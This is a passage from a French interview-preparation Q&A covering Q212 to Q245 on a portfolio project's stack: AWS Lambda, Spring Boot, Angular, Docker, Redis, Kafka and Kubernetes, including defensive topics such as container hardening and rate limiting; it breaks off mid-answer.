**Reusable Workflows** (`workflow_call`) : un workflow complet réutilisable par d'autres workflows.
```yaml
# .github/workflows/deploy-template.yml
on:
  workflow_call:
    inputs:
      environment: {required: true, type: string}
```

**Composite Actions** (`action.yml`) : séquence d'étapes regroupées en une seule action réutilisable.

**Différence** : les reusable workflows ont leurs propres runners (parallélisation possible), les composite actions s'exécutent dans le runner appelant.

Dans ce projet, un candidat à la refactoring serait d'extraire les étapes communes aux workflows CI backend et frontend (checkout, setup Java, cache Maven) en composite action pour réduire la duplication.

---

## AWS Lambda Avancé

### Q212 — Qu'est-ce que le cold start Lambda et comment le réduire ?

Un cold start se produit quand Lambda doit initialiser un nouveau container d'exécution (runtime, dépendances, connexions DB). Sur Node.js, c'est ~100-300ms. Sur JVM (non utilisé ici pour les Lambdas), c'est 2-5 secondes.

**Réductions appliquées dans ce projet** :
- **Runtimes légers** : Node.js 22.x (natif) plutôt que JVM pour les 3 Lambdas
- **Bundle minimal** : chaque Lambda n'inclut que ses dépendances (`@aws-sdk/client-ses` seulement pour contact-form)
- **Éviter les connexions globales** : ne pas initialiser de connexion DB dans le handler (hors scope)

**Techniques avancées** (si besoin) :
- **Provisioned Concurrency** : pré-chauffe N instances → cold start = 0ms, coût fixe
- **SnapStart** (Java 21 Lambda) : snapshot de la JVM initialisée → cold start < 1s
- **Ping régulier** : EventBridge toutes les 5 minutes pour garder les containers chauds (hack)

---

### Q213 — Qu'est-ce que les Lambda Layers et comment les avez-vous utilisés ?

Un Layer est une archive ZIP contenant du code ou des dépendances partagées entre plusieurs Lambdas. Il est monté en `/opt/` dans l'environnement d'exécution.

Dans ce projet (Phase 15) :
- **Layer `sharp`** : la bibliothèque Sharp (traitement d'images) est volumineuse (~25MB). En la plaçant dans un Layer, les 3 Lambdas n'ont pas à la redéployer. Chaque `terraform apply` est plus rapide.
- **Layer de dépendances AWS SDK** : partagé entre `contact-form`, `image-resize` et `weekly-report`

```hcl
resource "aws_lambda_layer_version" "sharp_layer" {
  filename            = "layers/sharp-layer.zip"
  layer_name          = "sharp-image-processing"
  compatible_runtimes = ["nodejs22.x"]
}
```

Avantage supplémentaire : taille du déploiement Lambda réduite → déploiements plus rapides et durée maximale de 250MB toujours respectée.

---

## Sécurité & Compliance

### Q214 — Quelle est la différence entre JWT (Bearer) et OAuth2/OIDC ? Quand utiliser l'un ou l'autre ?

**JWT** est un format de token. **OAuth2** est un protocole d'autorisation. **OIDC** est OAuth2 + couche d'identité (authentication).

| | JWT (ce projet) | OAuth2/OIDC |
|--|----------------|-------------|
| Auth server | Spring Boot lui-même | Serveur tiers (Keycloak, Auth0, Cognito) |
| Cas d'usage | API interne, portfolio perso | SSO enterprise, login social |
| Complexité | Faible | Élevée |
| Single Sign-On | Non | Oui (un login, plusieurs apps) |
| Refresh Token | Implémenté manuellement | Standard OAuth2 |

**Dans ce projet** : JWT auto-géré par Spring Boot (`JwtTokenProvider`) — approprié pour une API portfolio avec un seul client Angular. 

**En enterprise** : Keycloak ou AWS Cognito pour le SSO entre applications, la gestion des rôles LDAP/AD, et déléguer la sécurité auth à un serveur dédié.

---

### Q215 — Comment avez-vous adressé la conformité RGPD dans ce projet ?

Le RGPD (Règlement Général sur la Protection des Données) encadre le traitement des données personnelles des citoyens européens.

Mesures appliquées :
1. **Données minimales** : le formulaire de contact collecte uniquement nom, email, message — rien de superflu
2. **Durée de rétention** : les logs CloudWatch ont une rétention de 30 jours (pas de conservation indéfinie)
3. **Chiffrement** : données en transit (HTTPS) et au repos (RDS chiffré, Secrets Manager chiffré KMS)
4. **Localisation** : infrastructure en `eu-west-3` (Paris) — données hébergées en UE
5. **Accès** : seul l'admin (IAM Role dédié) peut accéder aux données

**Ce qui manquerait pour une vraie app RGPD** :
- Politique de confidentialité affichée
- Droit à l'effacement (DELETE /users/{id} implémenté)
- Consentement explicite (cookie banner)
- DPA (Data Processing Agreement) avec AWS

---

## SRE & Métriques

### Q216 — Qu'est-ce que les SLI, SLO, SLA et l'Error Budget ? Donnez des exemples concrets.

Ces quatre concepts forment le cadre de fiabilité SRE (Site Reliability Engineering) :

- **SLI** (Service Level Indicator) : la métrique mesurée. Ex : `taux de requêtes réussies = requêtes_200 / total_requêtes`
- **SLO** (Service Level Objective) : l'objectif interne. Ex : SLI ≥ 99.5% sur 30 jours glissants
- **SLA** (Service Level Agreement) : le contrat client. Ex : disponibilité 99% garantie, sinon compensation. Toujours moins ambitieux que le SLO.
- **Error Budget** : ce qu'il reste avant de casser le SLO. Ex : SLO 99.5% sur 30 jours = 0.5% × 43200 min = **216 minutes de downtime autorisées**

**Usage de l'error budget** :
- Budget restant > 50% → équipe peut déployer fréquemment, expérimenter
- Budget restant < 10% → gel des déploiements risqués, focus fiabilité
- Budget épuisé → post-mortem obligatoire, road map gelée

Dans ce projet, ces métriques sont calculables via Prometheus (`rate(http_server_requests_seconds_count{status!~"5.."}[30d])`) mais pas encore formellement définies.

---

## Web Performance

### Q217 — Qu'est-ce que les Web Vitals (LCP, CLS, INP) et comment les mesurez-vous dans Angular ?

Les **Core Web Vitals** sont les métriques de performance UX définis par Google, intégrés dans le ranking SEO :

- **LCP** (Largest Contentful Paint) : temps avant que le plus grand élément visible soit chargé. Objectif : < 2.5s. Dans ce projet, c'est la hero image de la page d'accueil.
- **CLS** (Cumulative Layout Shift) : somme des décalages de mise en page inattendus. Objectif : < 0.1. Causé par des images sans dimensions définies, des fonts qui se chargent tard.
- **INP** (Interaction to Next Paint, remplace FID) : réactivité aux interactions. Objectif : < 200ms. Problématique si le thread JS est bloqué (heavy Angular component).

**Mesure** :
```bash
# Lighthouse CI dans le pipeline
npx @lhci/cli autorun --upload.target=temporary-public-storage
```

```typescript
// Angular API native
import { onINP, onLCP, onCLS } from 'web-vitals';
onLCP(metric => console.log('LCP:', metric.value));
```

---

## Docker Avancé

### Q218 — Qu'est-ce que Docker BuildKit et en quoi améliore-t-il les builds ?

BuildKit est le backend de build Docker (activé par défaut depuis Docker 23). Améliorations majeures :

1. **Cache monté** : partager le cache Maven/npm entre builds sans le copier dans l'image
```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=cache,target=/root/.m2 mvn package -DskipTests
```
Le cache Maven persiste entre les builds CI → division par 5 du temps de build.

2. **Parallélisme** : les stages multi-stage indépendants sont buildés en parallèle.

3. **Secrets sécurisés** : passer des secrets sans les stocker dans les layers
```dockerfile
RUN --mount=type=secret,id=npmrc cat /run/secrets/npmrc
```

4. **Build pour plusieurs architectures** :
```bash
docker buildx build --platform linux/amd64,linux/arm64 -t mon-image .
```
Utile pour les images qui doivent tourner sur M1 Mac (arm64) et EC2 (amd64).

Dans ce projet, le CI utilise `docker/setup-buildx-action` pour activer BuildKit.

---

## Java & Build

### Q219 — Qu'est-ce qu'un Maven BOM (Bill of Materials) et pourquoi l'utiliser ?

Un BOM est un POM spécial qui centralise les versions de dépendances. Au lieu de définir la version de chaque dépendance, on importe le BOM et on laisse Maven gérer les versions compatibles entre elles.

```xml
<dependencyManagement>
  <dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-dependencies</artifactId>
      <version>3.4.0</version>
      <type>pom</type>
      <scope>import</scope>
    </dependency>
  </dependencies>
</dependencyManagement>

<!-- Ensuite, plus besoin de version -->
<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-web</artifactId>
</dependency>
```

**Dans ce projet** : `spring-boot-starter-parent` hérite du BOM Spring Boot → Spring Security, Jackson, Hibernate ont tous des versions pré-testées compatibles entre elles. Dependabot met à jour la version Spring Boot → toutes les dépendances BOM suivent.

---

## Redis Avancé

### Q220 — Quelles sont les politiques d'éviction Redis et comment choisir la bonne ?

Quand Redis atteint sa limite mémoire (`maxmemory`), il applique une politique d'éviction pour libérer de l'espace.

| Politique | Comportement |
|-----------|-------------|
| `noeviction` | Erreur si limite atteinte — pour les données critiques |
| `allkeys-lru` | Évicte les clés les moins récemment utilisées parmi toutes |
| `volatile-lru` | LRU uniquement sur les clés avec TTL défini |
| `allkeys-lfu` | Évicte les clés les moins fréquemment utilisées |
| `volatile-ttl` | Évicte les clés dont le TTL expire le plus tôt |
| `allkeys-random` | Éviction aléatoire |

**Dans ce projet** : `volatile-lru` — les clés de cache ont toutes un TTL (5-10 min). Les clés sans TTL (sessions persistantes) ne sont jamais évictées. Configuration : `maxmemory-policy volatile-lru` dans `redis.conf`.

**Piège** : utiliser `noeviction` pour un cache → Redis renvoie des erreurs au lieu de se dégrader gracieusement.

---

## Kafka Avancé

### Q221 — Comment fonctionnent les Consumer Groups et les partitions dans Kafka ?

**Partitions** : un topic Kafka est découpé en N partitions. Les messages sont distribués sur les partitions (via la clé du message ou round-robin). L'ordre est garanti **au sein d'une partition**, pas entre partitions.

**Consumer Groups** : un groupe de consumers partage la consommation d'un topic. Kafka assigne exactement **une partition par consumer** dans le groupe. Avec 3 partitions et 3 consumers → parallélisme maximal. Avec 3 partitions et 5 consumers → 2 consumers sont inactifs.

```
Topic: portfolio.projects.created (3 partitions)
Consumer Group: audit-group
  Consumer 1 → Partition 0
  Consumer 2 → Partition 1
  Consumer 3 → Partition 2
```

**Offset** : chaque consumer maintient sa position (offset) dans sa partition. En cas de redémarrage, il reprend depuis le dernier offset commité (`enable.auto.commit=true` par défaut).

Dans ce projet, les consumers Kafka sont configurés avec `groupId = "portfolio-consumers"` — utile si on scale le backend en plusieurs instances (chaque instance consomme des partitions différentes).

---

## AWS Avancé

### Q222 — Qu'est-ce qu'AWS GuardDuty et comment l'avez-vous configuré ?

GuardDuty est un service de détection de menaces managé AWS. Il analyse en continu :
- **CloudTrail** : API calls suspects (ex: enumération IAM, accès depuis un pays inhabituel)
- **VPC Flow Logs** : trafic réseau anormal (port scanning, communication avec des IPs malveillantes)
- **DNS logs** : résolution de domaines malveillants connus

Types de findings :
- `UnauthorizedAccess:EC2/SSHBruteForce` — tentatives SSH répétées
- `Recon:EC2/PortProbeEMRUnprotectedPort` — scan de ports
- `CryptoCurrency:EC2/BitcoinTool.B` — mining de crypto sur l'EC2

Dans ce projet, GuardDuty n'est pas activé (hors Free Tier après 30 jours — ~$10/mois pour un petit compte). En production, c'est indispensable et les findings se connectent à Security Hub pour une vue centralisée.

---

## Spring Boot Avancé

### Q223 — Qu'est-ce que l'annotation `@Testcontainers` de Spring Boot 3.1+ ?

Spring Boot 3.1 a introduit une intégration native avec Testcontainers via `@ServiceConnection` — plus de configuration manuelle des URLs de connexion.

```java
// Avant Spring Boot 3.1 — configuration manuelle
@DynamicPropertySource
static void registerProperties(DynamicPropertyRegistry registry) {
  registry.add("spring.datasource.url", postgres::getJdbcUrl);
  registry.add("spring.datasource.username", postgres::getUsername);
}

// Depuis Spring Boot 3.1 — @ServiceConnection
@Testcontainers
class ProjectRepositoryTest {
  @Container
  @ServiceConnection
  static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:15-alpine");

  // Spring Boot détecte @ServiceConnection et configure automatiquement la datasource
}
```

Avantage : zéro boilerplate, Spring Boot configure automatiquement la datasource, Redis, Kafka, RabbitMQ via `@ServiceConnection`. Dans ce projet, les tests d'intégration ont été mis à jour pour utiliser ce pattern.

---

## Réseau Avancé

### Q224 — Qu'est-ce que le mTLS (mutual TLS) et dans quel contexte l'utiliser ?

TLS classique : seul le serveur s'authentifie (certificat serveur). Le client est anonyme.

**mTLS** (mutual TLS) : les deux parties s'authentifient avec un certificat X.509. Le serveur vérifie le certificat client, le client vérifie le certificat serveur.

Cas d'usage :
- **Communication inter-services** : microservice A appelle microservice B → mTLS garantit l'identité des deux (pas seulement le chiffrement)
- **Zero Trust** : même dans un réseau interne, chaque service prouve son identité
- **API Gateway** : AWS API Gateway supporte le mTLS pour les clients qui s'y connectent

Dans ce projet : TLS classique (HTTPS Let's Encrypt). En architecture microservices, Istio (Q168) implémente le mTLS automatiquement entre pods sans modifier le code applicatif — c'est l'un de ses principaux atouts.

---

## Questions Comportementales Avancées

### Q225 — Comment gérez-vous la dette technique dans un projet en cours ?

La dette technique est inévitable — l'enjeu est de la rendre visible et de la gérer.

**Approche appliquée dans ce projet** :
1. **SonarCloud** : "Code Smells" et "Technical Debt" visibles à chaque PR. La dette est quantifiée en heures/jours.
2. **`TODO` commentaires** : avec un format standard (`// TODO: DEBT - raison`) pour les retrouver facilement
3. **Priorisation** : seule la dette qui impacte la sécurité, les performances ou la vélocité est prioritaire. La dette cosmétique attend.
4. **"Boy Scout Rule"** : chaque fois qu'on touche un fichier, on le laisse un peu plus propre qu'on ne l'a trouvé
5. **Budget dédié** : dans un vrai projet, réserver 20% du sprint pour la dette (pas traiter tout en urgence)

**À ne pas faire** : laisser la dette s'accumuler silencieusement jusqu'à ce qu'elle bloque les nouvelles features.

---

### Q226 — Décrivez un désaccord technique avec un collègue et comment vous l'avez résolu.

*(Question comportementale — réponse STAR)*

**Situation** : lors de la Phase 3 (Frontend), j'avais initialement prévu d'utiliser NgRx pour la gestion d'état, convaincu que c'était la "bonne" approche pour une app enterprise.

**Tâche** : décider de l'architecture de state management avant de coder les premiers composants.

**Action** : j'ai prototypé les deux approches — NgRx avec Store/Actions/Reducers et une approche Services + BehaviorSubject + Signals. J'ai comparé : NgRx ajoutait 400 lignes de boilerplate pour 3 services CRUD simples. Les Signals résolvaient le même problème en 50 lignes.

**Résultat** : j'ai documenté la comparaison dans `docs/PHASE3-Frontend.md`, expliqué le raisonnement, et adopté Services + Signals. Le critère décisif : la complexité doit être justifiée par un besoin réel, pas par le prestige de la technologie.

**Leçon** : un désaccord technique se résout avec des données et des prototypes, pas avec de l'autorité.

---

## AWS Réseau Avancé

### Q227 — Quelle est la différence entre VPC Peering et AWS Transit Gateway ?

**VPC Peering** : connexion directe entre deux VPCs (même compte ou cross-account). Simple, sans coût de données (sauf cross-région). Limitation : **non transitif** — si A↔B et B↔C, A ne peut pas parler à C via B.

**Transit Gateway** : hub central qui connecte N VPCs, VPNs et Direct Connects. Supporte le routage transitif. Idéal pour des architectures hub-and-spoke avec des dizaines de VPCs.

| | VPC Peering | Transit Gateway |
|--|-------------|-----------------|
| Connexions | 1-à-1 | N-à-N |
| Transitivité | Non | Oui |
| Coût | Gratuit (même région) | ~$0.05/h + données |
| Cas d'usage | 2-3 VPCs | 5+ VPCs |

Dans ce projet : un seul VPC, pas de peering nécessaire. En enterprise multi-compte (dev/staging/prod en comptes séparés), Transit Gateway centralise la connectivité.

---

## PostgreSQL Avancé

### Q228 — Comment utilisez-vous EXPLAIN ANALYZE pour optimiser une requête dans ce projet ?

`EXPLAIN ANALYZE` exécute vraiment la requête et affiche le plan d'exécution avec les temps réels.

```sql
EXPLAIN ANALYZE
SELECT p.*, ps.skill_id
FROM projects p
LEFT JOIN project_skills ps ON p.id = ps.project_id
WHERE p.status = 'ACTIVE'
ORDER BY p.sort_order;
```

Éléments à analyser :
- **Seq Scan** vs **Index Scan** : un Seq Scan sur une grande table = pas d'index utilisé
- **Rows** : si l'estimation est très différente de l'actuel → statistiques obsolètes (`ANALYZE`)
- **cost** : coût relatif (en unités arbitraires). Le nœud avec le coût le plus élevé est le goulot.
- **actual time** : temps réel en ms. Comparer `planning time` vs `execution time`.

**Outils complémentaires** :
- [explain.dalibo.com](https://explain.dalibo.com) : visualisation graphique du plan
- `pg_stat_statements` : historique des requêtes lentes en production

Dans ce projet, les migrations Flyway créent les index (`CREATE INDEX idx_projects_status ON projects(status)`) après avoir analysé les requêtes les plus fréquentes.

---

## Tests Avancés

### Q229 — Comment implémenteriez-vous du rate limiting dans ce projet Spring Boot ?

Trois approches par ordre de complexité :

**1. Bucket4j (in-process, Redis-backed)**
```java
@RateLimiter(name = "authEndpoint", fallbackMethod = "rateLimitFallback")
public ResponseEntity<AuthResponse> login(@RequestBody LoginRequest req) { ... }
```
Configuration : 5 tentatives/minute par IP, stockage Redis pour la cohérence entre instances.

**2. Spring Cloud Gateway** : filter de rate limiting côté gateway, avant que la requête atteigne le backend.

**3. AWS WAF** : rate limiting au niveau de l'infrastructure (1000 req/5min par IP), avant même que le trafic atteigne EC2.

Dans ce projet, la détection de brute-force via Prometheus (Q12) est réactive (alerte après coup). Bucket4j + Redis serait la prochaine évolution pour du rate limiting préventif sur `/auth/login`.

---

## Question de clôture

### Q230 — Quelle est la prochaine évolution prévue pour ce projet, et pourquoi ?

Trois évolutions prioritaires, dans l'ordre :

**1. HTTPS + mTLS pour les communications inter-services** (court terme)
Les communications backend → RDS utilisent SSL mais pas de vérification du certificat client. Configurer `ssl-mode=verify-full` avec un certificat client serait un vrai Zero Trust.

**2. OpenTelemetry Tracing distribué** (moyen terme)
Actuellement : métriques (Micrometer + Prometheus) et logs (CloudWatch). Il manque la troisième colonne de l'observabilité — les **traces**. Micrometer Tracing + OTLP exporter vers un backend Tempo (Grafana) permettrait de corréler une requête HTTP à travers le backend, Redis, PostgreSQL, et les Lambdas.

**3. Platform Engineering — Backstage** (long terme)
Transformer ce portfolio en une véritable Internal Developer Platform avec Backstage : catalog de services, templates de microservices, golden paths, TechDocs auto-générée depuis les `docs/*.md`. C'est l'évolution naturelle du "You Build It, You Run It" vers le "We Enable You to Build and Run It".

---

## Java / JVM Avancé

### Q231 — Qu'est-ce que Lombok et quels sont ses inconvénients ?

Lombok est une librairie Java qui génère du boilerplate à la compilation via des annotations :
- `@Getter`/`@Setter` → accesseurs
- `@Builder` → pattern Builder fluent
- `@Data` → `@Getter + @Setter + @ToString + @EqualsAndHashCode`
- `@Slf4j` → injecte un logger `log`
- `@RequiredArgsConstructor` → constructeur avec les champs `final`

Dans ce projet, `@RequiredArgsConstructor` remplace l'injection par constructeur boilerplate.

**Inconvénients** :
1. **Magie invisible** : le code généré n'apparaît pas dans l'IDE sauf avec le plugin. Difficile pour les nouveaux arrivants.
2. **`@Data` sur les entités JPA** : génère `equals/hashCode` sur tous les champs → deux entités avec le même `id` mais des listes chargées différemment peuvent avoir des `hashCode` différents → bugs subtils avec les collections.
3. **Couplage à l'IDE** : nécessite un plugin Lombok dans IntelliJ/VS Code.
4. **Pièges `@Builder`** : les valeurs par défaut des champs ne sont pas conservées sans `@Builder.Default`.

**Règle** : utiliser `@Slf4j`, `@RequiredArgsConstructor`, `@Getter`. Éviter `@Data` sur les entités JPA — préférer des records ou des `equals/hashCode` explicites basés sur l'`id`.

---

### Q232 — Qu'est-ce que MapStruct et pourquoi l'utiliser plutôt que du mapping manuel ?

MapStruct génère du code de mapping entre objets Java à la compilation (pas de réflexion au runtime).

```java
@Mapper(componentModel = "spring")
public interface ProjectMapper {
    ProjectResponse toResponse(Project project);
    Project toEntity(ProjectRequest request);
}
```

MapStruct génère l'implémentation à la compilation — type-safe, visible dans le code généré, sans réflexion.

**Comparaison** :

| | Mapping manuel | MapStruct | ModelMapper |
|--|---------------|-----------|-------------|
| Performance | Excellente | Excellente | Mauvaise (réflexion) |
| Type safety | Oui | Oui | Non |
| Maintenabilité | Faible (verbeux) | Bonne | Bonne |
| Lisibilité | Faible | Bonne | Bonne |

**Dans ce projet** : `ProjectMapper`, `SkillMapper`, `UserMapper` — chaque couche (entity ↔ DTO) a son mapper. Si un champ change dans l'entité, MapStruct génère une erreur de compilation immédiatement → aucun bug silencieux.

---

### Q233 — Comment configurez-vous `@PreAuthorize` avec des expressions SpEL complexes ?

`@PreAuthorize` utilise SpEL (Spring Expression Language) pour les règles d'autorisation fines.

```java
// Rôle simple
@PreAuthorize("hasRole('ADMIN')")
public void deleteProject(Long id) { ... }

// Plusieurs rôles
@PreAuthorize("hasAnyRole('ADMIN', 'EDITOR')")
public void updateProject(Long id, ProjectRequest req) { ... }

// L'utilisateur peut modifier son propre profil OU un admin peut modifier n'importe qui
@PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
public void updateUser(Long userId, UserRequest req) { ... }

// Accès conditionnel à la méthode ET vérification d'un paramètre
@PreAuthorize("hasRole('ADMIN') and #req.status != null")
public Page<Project> getProjectsByStatus(ProjectStatus status) { ... }
```

**Activation** : `@EnableMethodSecurity(prePostEnabled = true)` dans `SecurityConfig`.

**Piège** : `@PreAuthorize` ne fonctionne pas sur les méthodes `private` ou appelées en interne (proxy AOP). Dans ce projet, toutes les vérifications sont sur les méthodes `public` des controllers — les services n'ont pas de `@PreAuthorize`.

---

### Q234 — Quelle est la différence entre G1GC et ZGC en Java 21 ?

Le **Garbage Collector** libère la mémoire des objets inutilisés. Deux GC modernes en Java 21 :

**G1GC** (Garbage First, défaut depuis Java 9) :
- Divise le heap en régions
- Pause cible configurable (`-XX:MaxGCPauseMillis=200ms`)
- Bon équilibre latence/throughput
- Adapté pour la plupart des applications web

**ZGC** (Z Garbage Collector, productible depuis Java 15) :
- Pauses ultra-courtes : < 1ms, peu importe la taille du heap
- Scalable jusqu'à plusieurs TB de heap
- Overhead CPU légèrement plus élevé
- Idéal pour les applications latence-critique (trading, gaming, API < 5ms)

Pour ce projet (t3.small, Spring Boot API REST) : **G1GC** est suffisant. La latence cible est < 200ms — G1GC la respecte aisément.

**Virtual Threads (Java 21)** : orthogonal au choix du GC. Les virtual threads ne créent pas plus de pression GC que les platform threads.

---

### Q235 — Qu'est-ce que Spring Boot `@ConditionalOnProperty` et comment l'utiliser ?

`@ConditionalOnProperty` active un bean uniquement si une propriété de configuration est présente et a une valeur donnée.

```java
// Bean activé uniquement si kafka.enabled=true
@Configuration
@ConditionalOnProperty(name = "kafka.enabled", havingValue = "true", matchIfMissing = false)
public class KafkaConfig { ... }
```

Dans ce projet, Kafka peut être désactivé :
```properties
# application-test.properties
kafka.enabled=false
spring.kafka.listener.auto-startup=false
```

Avantage : le workflow DAST ZAP démarre le backend sans Kafka (`-Dspring.kafka.listener.auto-startup=false`). Sans `@ConditionalOnProperty`, Spring Boot essaierait de connecter Kafka au démarrage → timeout → échec du test DAST.

C'est aussi utile pour les features flags côté backend : activer une nouvelle feature uniquement sur staging via une variable d'environnement.

---

## Angular Avancé (suite)

### Q236 — Qu'est-ce que les composants standalone Angular et en quoi changent-ils l'architecture ?

Avant Angular 14 : chaque composant devait appartenir à un `NgModule`. Les modules géraient les imports, exports, providers.

**Standalone components** (Angular 14+, défaut depuis Angular 17) : chaque composant déclare ses propres dépendances.

```typescript
@Component({
  selector: 'app-project-card',
  standalone: true,
  imports: [CommonModule, RouterModule, MatCardModule], // imports directs
  template: `...`
})
export class ProjectCardComponent { }
```

**Avantages** :
- Tree-shaking plus précis : Angular n'importe que ce qui est réellement utilisé
- Moins de boilerplate : plus de `declarations`, `exports` dans les modules
- Lazy loading simplifié : `loadComponent(() => import('./project-detail.component'))` au lieu de `loadChildren`

**Dans ce projet** : migration vers standalone components en cours. Le `AppModule` est remplacé par `app.config.ts` avec `bootstrapApplication`.

---

### Q237 — Qu'est-ce que `computed()` et `effect()` dans Angular Signals ?

Au-delà de `signal()` de base, Angular Signals offre deux primitives avancées :

**`computed()`** : signal dérivé qui recalcule automatiquement quand ses dépendances changent.
```typescript
readonly projects = signal<Project[]>([]);
readonly featuredProjects = computed(() =>
  this.projects().filter(p => p.featured)
);
// featuredProjects se met à jour automatiquement quand projects change
```

**`effect()`** : exécute un side-effect quand un signal change (logging, analytics, synchronisation avec localStorage).
```typescript
constructor() {
  effect(() => {
    // Relance quand currentUser change
    const user = this.authService.currentUser();
    if (user) analytics.identify(user.id);
  });
}
```

**Règles** :
- `computed()` doit être pur (pas de side effects)
- `effect()` s'exécute dans le contexte d'injection → créer dans le constructeur ou avec `injector`
- `effect()` se nettoie automatiquement à la destruction du composant

---

### Q238 — Quelle est la différence entre `switchMap`, `mergeMap`, `concatMap` et `exhaustMap` en RxJS ?

Ces quatre opérateurs projettent chaque valeur source vers un Observable interne, mais gèrent différemment les valeurs concurrentes :

```typescript
searchInput$.pipe(
  debounceTime(300),
  switchMap(query => this.projectService.search(query))
  // Annule la requête précédente si une nouvelle valeur arrive → PARFAIT pour la recherche
);

uploadFiles$.pipe(
  mergeMap(file => this.uploadService.upload(file))
  // Tous les uploads en parallèle → pour des opérations indépendantes
);

formSubmit$.pipe(
  concatMap(data => this.projectService.create(data))
  // Attend que chaque création soit terminée avant la suivante → ordre garanti
);

buttonClick$.pipe(
  exhaustMap(() => this.authService.refresh())
  // Ignore les clics pendant qu'un refresh est en cours → évite les appels dupliqués
);
```

**Dans ce projet** :
- Recherche de projets → `switchMap`
- Soumission de formulaire → `exhaustMap` (évite le double submit)
- Upload d'images → `mergeMap`

---

### Q239 — Comment gérez-vous l'internationalisation (i18n) dans Angular ?

Deux approches principales :

**Angular i18n natif** (`@angular/localize`) :
```html
<p i18n="@@project.description">Description du projet</p>
```
Génère un fichier XLIFF à traduire. `ng build --localize` crée un bundle par langue. Avantage : meilleure performance (pas de pipe), meilleur SSR. Inconvénient : rebuild complet pour chaque langue.

**ngx-translate** :
```html
{{ 'project.description' | translate }}
```
Chargement dynamique des fichiers JSON de traduction. Changement de langue sans rechargement. Plus flexible mais légèrement moins performant.

**Dans ce projet** : le site est en FR/EN/DE (Phase 17). L'implémentation utilise un service `TranslationService` avec détection de la langue navigateur et stockage du choix en `localStorage`. Les fichiers de traduction (`assets/i18n/fr.json`, `en.json`, `de.json`) sont chargés à la demande via `HttpClient`.

---

### Q240 — Qu'est-ce que l'Angular CDK et donnez des exemples d'utilisation ?

Le CDK (Component Dev Kit) est la couche comportementale d'Angular Material — accessible sans le thème visuel Material.

Primitives disponibles :
- **`DragDropModule`** : drag and drop avec `cdkDrag`, `cdkDropList`. Dans ce projet : réordonnancement des projets admin.
- **`OverlayModule`** : positionnement intelligent de popups/tooltips (gère les bords d'écran).
- **`A11yModule`** : gestion du focus trap dans les modales (`cdkTrapFocus`), `LiveAnnouncer` pour les lecteurs d'écran.
- **`ScrollingModule`** : virtual scrolling pour les longues listes (`<cdk-virtual-scroll-viewport>`). Seules les lignes visibles sont dans le DOM.
- **`PortalModule`** : rendre un composant hors de sa hiérarchie DOM normale.

**Avantage** : utiliser le CDK sans Angular Material → comportements robustes sans imposer le thème Material Design à toute l'équipe design.

---

## Container Security & Kubernetes

### Q241 — Comment sécurisez-vous un container Docker (non-root, read-only, capabilities) ?

Checklist de sécurité container appliquée dans ce projet :

**1. Utilisateur non-root** :
```dockerfile
# Backend
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
```
Un container root peut exploiter des vulnérabilités kernel. L'utilisateur `appuser` (UID 1000+) limite l'impact.

**2. Filesystem en lecture seule** :
```yaml
# docker-compose.yml
security_opt:
  - no-new-privileges:true
read_only: true
tmpfs:
  - /tmp  # seul /tmp est writable
```

**3. Capabilities Linux limitées** :
```yaml
cap_drop:
  - ALL
cap_add:
  - NET_BIND_SERVICE  # seulement si port < 1024
```

**4. Pas de `--privileged`** : donne accès complet au kernel host — à ne jamais utiliser en production.

**5. Image minimale** : `eclipse-temurin:21-jre-alpine` (~180MB) plutôt que `ubuntu:latest` (~900MB) — surface d'attaque réduite.

---

### Q242 — Qu'est-ce que les images "distroless" et quand les utiliser ?

Les images distroless (projet Google) ne contiennent que l'application et ses dépendances runtime — pas de shell, pas de package manager, pas d'utilitaires système.

```dockerfile
# Multi-stage avec distroless
FROM maven:3.9-eclipse-temurin-21 AS builder
RUN mvn package -DskipTests

FROM gcr.io/distroless/java21-debian12
COPY --from=builder /app/target/backend.jar /app.jar
ENTRYPOINT ["/usr/bin/java", "-jar", "/app.jar"]
```

**Avantages** :
- Surface d'attaque minimale : si un attaquant pénètre le container, pas de shell pour exécuter des commandes
- Taille réduite : ~50MB vs ~180MB Alpine JRE
- Pas de CVEs liées aux utilitaires système (bash, curl, etc.)

**Inconvénients** :
- Débogage difficile : `docker exec -it container bash` → impossible (pas de shell)
- Solution : utiliser un stage debug en dev : `FROM gcr.io/distroless/java21-debian12:debug`

---

### Q243 — Quelle est la différence entre `requests` et `limits` Kubernetes ?

Ces deux paramètres contrôlent les ressources allouées à un pod :

```yaml
resources:
  requests:
    memory: "256Mi"
    cpu: "250m"    # 0.25 core
  limits:
    memory: "512Mi"
    cpu: "500m"
```

- **`requests`** : garantie minimale. Le scheduler place le pod sur un nœud ayant au moins ces ressources disponibles. Le pod y a toujours accès.
- **`limits`** : plafond maximum. Si le pod dépasse la limite CPU → throttling. Si il dépasse la limite mémoire → **OOM Kill** (processus tué par le kernel).

**Règles pratiques** :
- Toujours définir requests ET limits (sans requests, le scheduler est aveugle)
- `limits.memory` ≥ `requests.memory` (ne jamais les inverser)
- Pour Spring Boot : `requests.memory: 384Mi`, `limits.memory: 512Mi` (laisser de la marge pour le GC)
- CPU : limits élevés ou sans limite (le throttling CPU crée des problèmes de latence)

---

### Q244 — Quelle est la différence entre Kubernetes ConfigMap et Secret ?

Les deux stockent de la configuration externalisée, mais diffèrent sur la sensibilité des données :

**ConfigMap** : données non-sensibles (URLs, feature flags, config applicative)
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: portfolio-config
data:
  SPRING_PROFILES_ACTIVE: "prod"
  BACKEND_URL: "http://backend-service:8080"
  LOG_LEVEL: "WARN"
```

**Secret** : données sensibles (mots de passe, tokens, clés). Encodées en base64 (pas chiffrées par défaut !).
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: portfolio-secrets
type: Opaque
data:
  JWT_SECRET: base64encodedvalue==
  DB_PASSWORD: base64encodedvalue==
```

**Problème** : les Secrets Kubernetes ne sont pas chiffrés en etcd par défaut → External Secrets Operator (Phase 21) synchronise depuis AWS Secrets Manager (chiffré KMS) vers des K8s Secrets — bien plus sécurisé.

---

### Q245 — Qu'est-ce qu'un Kubernetes Init Container et quand l'utiliser ?

Un init container s'exécute **avant** les containers principaux et doit terminer avec succès. S'il échoue, K8s redémarre le pod.

Cas d'usage dans ce projet :
```yaml
initContainers:
